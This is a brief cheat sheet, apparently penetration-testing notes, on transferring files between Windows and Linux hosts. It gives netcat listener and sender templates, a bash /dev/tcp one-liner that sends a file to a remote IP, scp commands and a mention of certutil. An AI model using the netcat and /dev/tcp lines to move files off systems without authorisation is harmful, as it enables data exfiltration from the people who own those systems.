# Transferring Files
windows -> windows
windows -> linux
linux -> windows
linux -> linux

Downloading
Uploading


`nc -lnvp <PORT> > <FILE>` Receiver
`nc -q 0 <IP> <PORT> < <FILE>` Sender
`bash -c 'cat <FILE> > /dev/tcp/<IP>/<PORT>'` Sender

FROM ME
`scp <FILE> <USER>@<IP>:<FILE>` Upload - Via SSH, needs user password
`scp <USER>@<IP>:<FILE> <FILE>` Download\

certutil